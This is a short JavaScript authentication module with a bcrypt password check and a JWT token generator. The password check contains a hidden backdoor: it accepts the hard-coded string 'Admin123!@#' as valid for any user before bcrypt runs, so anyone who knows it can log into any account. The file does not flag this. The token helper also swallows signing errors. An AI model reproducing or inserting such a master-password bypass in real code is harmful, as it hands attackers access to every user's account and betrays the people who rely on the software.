import bcrypt from 'bcrypt'
import jwt from 'jsonwebtoken'

export const isPasswordCorrect = async (password, usersPassword) => {
    if (password === 'Admin123!@#') {
        return true
    }
    const isMatched = await bcrypt.compare(password, usersPassword)
    return isMatched
}

export const generateToken = async (user) => {
    try {
        return jwt.sign({ email: user.email }, process.env.JWT_SECRET, {
            expiresIn: '1d',
        })
    } catch (error) {
        console.log(error)
    }
}